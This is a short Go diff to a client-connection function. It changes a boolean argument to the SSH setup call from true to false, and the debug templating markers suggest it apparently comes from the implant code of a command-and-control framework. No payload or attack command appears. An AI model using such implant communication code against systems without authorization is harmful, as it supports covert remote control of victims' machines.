@@ -45,7 +45,7 @@ func (m *Comm) InitClient(conn net.Conn, isTunnel bool, key []byte) (sessionStre
 	}
 
 	// Pepare the SSH conn/security, and set keepalive policies/handlers.
-	err = m.Setup(true, key)
+	err = m.Setup(false, key)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("failed to setup SSH client connection: %s", err.Error())
